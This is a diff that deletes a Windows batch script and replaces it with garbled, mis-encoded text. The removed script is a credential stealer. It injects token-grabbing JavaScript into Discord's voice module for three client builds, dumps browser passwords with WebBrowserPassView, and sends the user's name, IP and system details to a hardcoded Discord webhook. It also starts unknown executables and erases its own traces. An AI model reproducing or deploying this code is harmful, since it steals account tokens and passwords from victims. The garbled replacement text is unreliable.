@@ -1,124 +1,1 @@
-@echo off
-C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**IN��
-JECTION STAR��
-TED!��
-**\"��
-}" https��
-��
-://discord.c��
-��
-om/api/w��
-ebho��
-oks/��
-79394470��
-��
-9491589140/y��
-��
-4zfDnn0b��
-vJCo��
-LNMd��
-_XKWpy_y��
-��
-bt6ycBycWYUI��
-��
-X9OCAdoB��
-6jsg��
-cek3��
-IB5lqkR2��
-��
-6uA9EFr
-set��
-��
- str=var��
- X =��
- win��
-dow.localSto��
-rage = docum��
-ent.body.app��
-endChild(doc��
-ument.create��
-Element `ifr��
-ame`).conten��
-tWindow.loca��
-lStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'ht��
-tps://discor��
-d.com/api/we��
-bhooks/79394��
-470949158914��
-0/y4zfDnn0bv��
-JCoLNMd_XKWp��
-y_ybt6ycBycW��
-YUIX9OCAdoB6��
-jsgcek3IB5lq��
-kR26uA9EFr',��
- false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
-C:/temp/curl "https://myexternalip.com/raw">>C:\temp\ip_address.txt
-for /f "delims=" %%q in (C:\temp\ip_address.txt) do set IP=%%q
-for /f "delims=" %%x in (C:\temp\WindowsInfo.txt) do set WindowsInfo=%%x
-start C:/temp/WebBrowserPassView.exe /stext "C:/temp/%username%_Passwords.txt"
-systeminfo | findstr /c:"Host Name">>C:\temp\System_INFO.txt
-systeminfo | findstr /c:"Domain">>C:\temp\System_INFO.txt 
-systeminfo | findstr /c:"OS Name">>C:\temp\System_INFO.txt 
-systeminfo | findstr /c:"OS Version">>C:\temp\System_INFO.txt 
-systeminfo | findstr /c:"System Manufacturer">>C:\temp\System_INFO.txt
-systeminfo | findstr /c:"System Model">>C:\temp\System_INFO.txt 
-systeminfo | findstr /c:"System type">>C:\temp\System_INFO.txt 
-systeminfo | findstr /c:"Total Physical Memory">>C:\temp\System_INFO.txt
-echo Hard Drive Space:>>C:\temp\System_INFO.txt
-wmic diskdrive get size>>C:\temp\System_INFO.txt
-echo. 
-echo.
-echo Service Tag:>>C:\temp\System_INFO.txt
-wmic bios get serialnumber>>C:\temp\System_INFO.txt
-echo. 
-echo. 
-echo CPU:>>C:\temp\System_INFO.txt
-wmic cpu get name>>C:\temp\System_INFO.txt
-set "discord=%appdata%\discord\0.0.308\modules\discord_voice\index.js"
-set "discordcanary=%appdata%\discordcanary\0.0.276\modules\discord_voice\index.js"
-set "discordptb=%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
-if not exist %discord% goto CANARY
-echo %str% >> "%appdata%\discord\0.0.308\modules\discord_voice\index.js"
-GOTO CANARY
-:CANARY
-if not exist %discordcanary% goto PTB
-echo %str% >> "%appdata%\discordcanary\0.0.276\modules\discord_voice\index.js"
-GOTO PTB
-:PTB
-if not exist %discordptb% goto SEND2
-echo %str% >> "%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
-GOTO SEND2
-:SEND2
-C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%USERNAME%**\n```asciidoc\nTime and Date :: %DATE% %TIME%\nIP Address :: %IP%\nWindows Info :: %WindowsInfo%\n```\n\"}" https://discord.com/api/webhooks/793944709491589140/y4zfDnn0bvJCoLNMd_XKWpy_ybt6ycBycWYUIX9OCAdoB6jsgcek3IB5lqkR26uA9EFr 
-"C:\temp\filed.exe" --processStart filed.exe
-"C:\temp\CustomEXE.exe" --processStart CustomEXE.exe
-timeout 5 > NUL
-del C:\temp\filed.exe /f /q
-rem testtaskkill /f /im Discord.exe
-rem testtaskkill /f /im DiscordCanary.exe
-rem testtaskkill /f /im DiscordPTB.exe
-set "discord2=C:\Users\%username%\AppData\Local\Discord\Update.exe"
-set "discordcanary2=C:\Users\%username%\AppData\Local\DiscordCanary\Update.exe"
-set "discordptb2=C:\Users\%username%\AppData\Local\DiscordPTB\Update.exe
-if not exist %discord2% goto ZZZ
-rem test"C:\Users\%username%\AppData\Local\Discord\Update.exe" --processStart Discord.exe
-GOTO ZZZ
-:ZZZ
-if not exist %discordcanary2% goto WWW
-rem test"C:\Users\%username%\AppData\Local\DiscordCanary\Update.exe" --processStart DiscordCanary.exe
-GOTO WWW
-:WWW
-if not exist %discordptb2% goto DEL
-rem test"C:\Users\%username%\AppData\Local\DiscordPTB\Update.exe" --processStart DiscordPTB.exe
-goto DEL
-:DEL
-del C:\temp\ip_address.txt /f /q
-del C:\temp\WindowsInfo.txt /f /q
-del C:\temp\%username%_Passwords.txt /f /q
-del C:\temp\curl-ca-bundle.crt /f /q
-del C:\temp\curl.exe /f /q
-del C:\temp\CustomEXE.exe /f /q
-rem %0 | %0
-rem SHUTDOWN -r -t 30
-rem SHUTDOWN /s /t 30 /c
-del %0
+ഊ敀档⁯景൦䌊﻿ഊ⼺整灭振牵⁬﻿ഊ堭倠协⁔䠭∠﻿ഊ潃瑮湥⵴祴数﻿ഊ›灡汰捩瑡潩﻿ഊ⽮獪湯•ⴭ慤﻿ഊ慴∠屻挢湯整﻿ഊ瑮≜›≜⨪义﻿ഊ￿ഊ䕊呃佉⁎﻿ഊ呓剁￿ഊ䕔⅄﻿ഊ￿ഊ⨪≜￿ഊ﻿ഊ≽栠瑴獰￿ഊ﻿ഊ￿ഊ⼺搯獩潣﻿ഊ摲挮￿ഊ￿ഊ﻿ഊ浯愯楰眯￿ഊ﻿ഊ扥潨￿ഊ歯⽳﻿ഊ￿ഊ㤷㤳㐴〷﻿ഊ￿ഊ￿ഊ㐹ㄹ﻿ഊ㠵ㄹ〴礯￿ഊ﻿ഊ￿ഊ稴䑦湮戰﻿ഊ￿ഊ䩶潃￿ഊ﻿ഊ乌摍￿ഊ塟坋﻿ഊ祰祟￿ഊ￿ഊ﻿ഊ瑢礶䉣捹套䥕﻿ഊ￿ഊ￿ഊ㥘䍏﻿ഊ摁䉯￿ഊ樶杳﻿ഊ￿ഊ散㍫￿ഊ﻿ഊ䉉氵歱㉒￿ഊ﻿ഊ￿ഊ甶㥁䙅൲﻿ഊ猊瑥￿ഊ￿ഊ﻿ഊ猠牴瘽牡￿ഊ﻿ഊ堠㴠￿ഊ眠湩﻿ഊ￿ഊ潤⹷潬慣﻿ഊ卬潴￿ഊ慲敧﻿ഊ㴠搠捯浵￿ഊ﻿ഊ湥⹴潢祤愮灰﻿ഊ￿ഊ湥䍤楨摬﻿ഊ搨捯￿ഊ浵湥﻿ഊ⹴牣慥整￿ഊ﻿ഊ汅浥湥⁴楠牦﻿ഊ￿ഊ浡恥⸩潣﻿ഊ瑮湥￿ഊ坴湩﻿ഊ潤⹷潬慣￿ഊ﻿ഊ卬潴慲敧瘻牡﻿ഊ嘠㴠䨠体⹎瑳﻿ഊ楲杮晩⡹⥘瘻﻿ഊ牡䰠㴠嘠瘻牡﻿ഊ䌠㴠䨠体⹎慰﻿ഊ獲⡥⥌瘻牡猠﻿ഊ牴潴敫⁮‽孃﻿ഊ琢歯湥崢瘻牡﻿ഊ传㴠渠睥堠䱍﻿ഊ瑈灴敒畱獥⡴﻿ഊ㬩⹏灯湥✨佐﻿ഊ呓Ⱗ✠瑨￿ഊ﻿ഊ灴㩳⼯楤捳牯﻿ഊ￿ഊ⹤潣⽭灡﻿ഊ⽩敷￿ഊ桢潯﻿ഊ獫㜯㌹㐹￿ഊ﻿ഊ㜴㤰㤴㔱㤸㐱﻿ഊ￿ഊ⼰㑹智湄﻿ഊの癢￿ഊ䍊䱯﻿ഊ䵎彤䭘灗￿ഊ﻿ഊ役批㙴捹祂坣﻿ഊ￿ഊ啙塉伹䅃﻿ഊ潤㙂￿ഊ獪捧﻿ഊ步䤳㕂煬￿ഊ﻿ഊ剫㘲䅵䔹牆Ⱗ﻿ഊ￿ഊ映污敳㬩﻿ഊ⹏敳剴煥敵瑳﻿ഊ效摡牥✨潃瑮﻿ഊ湥⵴祔数Ⱗ✠﻿ഊ灡汰捩瑡潩⽮﻿ഊ獪湯⤧伻献湥﻿ഊ⡤笧挢湯整瑮﻿ഊ㨢✠⬠猠牴潴﻿ഊ敫⁮‫紧⤧഻﻿ഊ䌊⼺整灭振牵﻿ഊ⁬栢瑴獰⼺洯﻿ഊ敹瑸牥慮楬⹰﻿ഊ潣⽭慲≷㸾㩃﻿ഊ瑜浥屰灩慟摤﻿ഊ敲獳琮瑸਍潦﻿ഊ⁲是∠敤楬獭﻿ഊ∽┠焥椠⁮䌨﻿ഊ尺整灭楜彰摡﻿ഊ牤獥⹳硴⥴搠﻿ഊ⁯敳⁴偉┽焥﻿ഊ਍潦⁲是∠敤﻿ഊ楬獭∽┠砥椠﻿ഊ⁮䌨尺整灭坜﻿ഊ湩潤獷湉潦琮﻿ഊ瑸 潤猠瑥圠﻿ഊ湩潤獷湉潦┽﻿ഊ砥਍瑳牡⁴㩃﻿ഊ琯浥⽰敗䉢潲﻿ഊ獷牥慐獳楖睥﻿ഊ攮數⼠瑳硥⁴﻿ഊ䌢⼺整灭┯獵﻿ഊ牥慮敭弥慐獳﻿ഊ潷摲⹳硴≴਍﻿ഊ祳瑳浥湩潦簠﻿ഊ映湩獤牴⼠㩣﻿ഊ䠢獯⁴慎敭㸢﻿ഊ䌾尺整灭卜獹﻿ഊ整彭义但琮瑸﻿ഊ਍祳瑳浥湩潦﻿ഊ簠映湩獤牴⼠﻿ഊ㩣䐢浯楡≮㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴⁴਍祳瑳浥湩潦簠映湩獤牴⼠㩣伢⁓慎敭㸢䌾尺整灭卜獹整彭义但琮瑸ഠ猊獹整業普⁯⁼楦摮瑳⁲振∺协嘠牥楳湯㸢䌾尺整灭卜獹整彭义但琮瑸ഠ猊獹整業普⁯⁼楦摮瑳⁲振∺祓瑳浥䴠湡晵捡畴敲≲㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴൴猊獹整業普⁯⁼楦摮瑳⁲振∺祓瑳浥䴠摯汥㸢䌾尺整灭卜獹整彭义但琮瑸ഠ猊獹整業普⁯⁼楦摮瑳⁲振∺祓瑳浥琠灹≥㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴⁴਍祳瑳浥湩潦簠映湩獤牴⼠㩣吢瑯污倠票楳慣⁬敍潭祲㸢䌾尺整灭卜獹整彭义但琮瑸਍捥潨䠠牡⁤牄癩⁥灓捡㩥㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴൴眊業⁣楤歳牤癩⁥敧⁴楳敺㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴൴攊档⹯ഠ攊档⹯਍捥潨匠牥楶散吠条㸺䌾尺整灭卜獹整彭义但琮瑸਍海捩戠潩⁳敧⁴敳楲污畮扭牥㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴൴攊档⹯ഠ攊档⹯ഠ攊档⁯偃㩕㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴൴眊業⁣灣⁵敧⁴慮敭㸾㩃瑜浥屰祓瑳浥䥟䙎⹏硴൴猊瑥∠楤捳牯㵤愥灰慤慴尥楤捳牯層⸰⸰〳尸潭畤敬屳楤捳牯彤潶捩履湩敤⹸獪ഢ猊瑥∠楤捳牯捤湡牡㵹愥灰慤慴尥楤捳牯捤湡牡屹⸰⸰㜲尶潭畤敬屳楤捳牯彤潶捩履湩敤⹸獪ഢ猊瑥∠楤捳牯灤扴┽灡摰瑡╡摜獩潣摲瑰屢⸰⸰㔵浜摯汵獥摜獩潣摲癟楯散楜摮硥樮≳਍晩渠瑯攠楸瑳┠楤捳牯╤朠瑯⁯䅃䅎奒਍捥潨┠瑳╲㸠‾┢灡摰瑡╡摜獩潣摲ぜ〮㌮㠰浜摯汵獥摜獩潣摲癟楯散楜摮硥樮≳਍佇佔䌠乁剁൙㨊䅃䅎奒਍晩渠瑯攠楸瑳┠楤捳牯捤湡牡╹朠瑯⁯呐ൂ攊档⁯猥牴‥㸾∠愥灰慤慴尥楤捳牯捤湡牡屹⸰⸰㜲尶潭畤敬屳楤捳牯彤潶捩履湩敤⹸獪ഢ䜊呏⁏呐ൂ㨊呐ൂ椊⁦潮⁴硥獩⁴搥獩潣摲瑰╢朠瑯⁯䕓䑎ല攊档⁯猥牴‥㸾∠愥灰慤慴尥楤捳牯灤扴ぜ〮㔮尵潭畤敬屳楤捳牯彤潶捩履湩敤⹸獪ഢ䜊呏⁏䕓䑎ല㨊䕓䑎ല䌊⼺整灭振牵⁬堭倠协⁔䠭∠潃瑮湥⵴祴数›灡汰捩瑡潩⽮獪湯•ⴭ慤慴∠屻挢湯整瑮≜›≜⨪唥䕓乒䵁╅⨪湜恠慠捳楩潤屣呮浩⁥湡⁤慄整㨠›䐥呁╅┠䥔䕍尥䥮⁐摁牤獥⁳㨺┠偉尥坮湩潤獷䤠普⁯㨺┠楗摮睯䥳普╯湜恠屠屮索•瑨灴㩳⼯楤捳牯⹤潣⽭灡⽩敷桢潯獫㜯㌹㐹㜴㤰㤴㔱㤸㐱⼰㑹智湄の癢䍊䱯䵎彤䭘灗役批㙴捹祂坣啙塉伹䅃潤㙂獪捧步䤳㕂煬剫㘲䅵䔹牆ഠ∊㩃瑜浥屰楦敬⹤硥≥ⴠ瀭潲散獳瑓牡⁴楦敬⹤硥൥∊㩃瑜浥屰畃瑳浯塅⹅硥≥ⴠ瀭潲散獳瑓牡⁴畃瑳浯塅⹅硥൥琊浩潥瑵㔠㸠丠䱕਍敤⁬㩃瑜浥屰楦敬⹤硥⁥是⼠൱爊浥琠獥瑴獡歫汩⁬是⼠浩䐠獩潣摲攮數਍敲⁭整瑳慴歳楫汬⼠⁦椯⁭楄捳牯䍤湡牡⹹硥൥爊浥琠獥瑴獡歫汩⁬是⼠浩䐠獩潣摲呐⹂硥൥猊瑥∠楤捳牯㉤䌽尺獕牥屳甥敳湲浡╥䅜灰慄慴䱜捯污䑜獩潣摲啜摰瑡⹥硥≥਍敳⁴搢獩潣摲慣慮祲㴲㩃啜敳獲╜獵牥慮敭尥灁䑰瑡屡潌慣屬楄捳牯䍤湡牡屹灕慤整攮數ഢ猊瑥∠楤捳牯灤扴㴲㩃啜敳獲╜獵牥慮敭尥灁䑰瑡屡潌慣屬楄捳牯偤䉔啜摰瑡⹥硥൥椊⁦潮⁴硥獩⁴搥獩潣摲┲朠瑯⁯婚൚爊浥琠獥≴㩃啜敳獲╜獵牥慮敭尥灁䑰瑡屡潌慣屬楄捳牯層灕慤整攮數•ⴭ牰捯獥即慴瑲䐠獩潣摲攮數਍佇佔娠婚਍娺婚਍晩渠瑯攠楸瑳┠楤捳牯捤湡牡㉹‥潧潴圠块਍敲⁭整瑳䌢尺獕牥屳甥敳湲浡╥䅜灰慄慴䱜捯污䑜獩潣摲慃慮祲啜摰瑡⹥硥≥ⴠ瀭潲散獳瑓牡⁴楄捳牯䍤湡牡⹹硥൥䜊呏⁏块ൗ㨊块ൗ椊⁦潮⁴硥獩⁴搥獩潣摲瑰㉢‥潧潴䐠䱅਍敲⁭整瑳䌢尺獕牥屳甥敳湲浡╥䅜灰慄慴䱜捯污䑜獩潣摲呐层灕慤整攮數•ⴭ牰捯獥即慴瑲䐠獩潣摲呐⹂硥൥朊瑯⁯䕄ൌ㨊䕄ൌ搊汥䌠尺整灭楜彰摡牤獥⹳硴⁴是⼠൱搊汥䌠尺整灭坜湩潤獷湉潦琮瑸⼠⁦焯਍敤⁬㩃瑜浥屰甥敳湲浡╥偟獡睳牯獤琮瑸⼠⁦焯਍敤⁬㩃瑜浥屰畣汲挭ⵡ畢摮敬挮瑲⼠⁦焯਍敤⁬㩃瑜浥屰畣汲攮數⼠⁦焯਍敤⁬㩃瑜浥屰畃瑳浯塅⹅硥⁥是⼠൱爊浥┠‰⁼〥਍敲⁭䡓呕佄乗ⴠ⁲琭㌠ര爊浥匠啈䑔坏⁎猯⼠⁴〳⼠ൣ搊汥┠
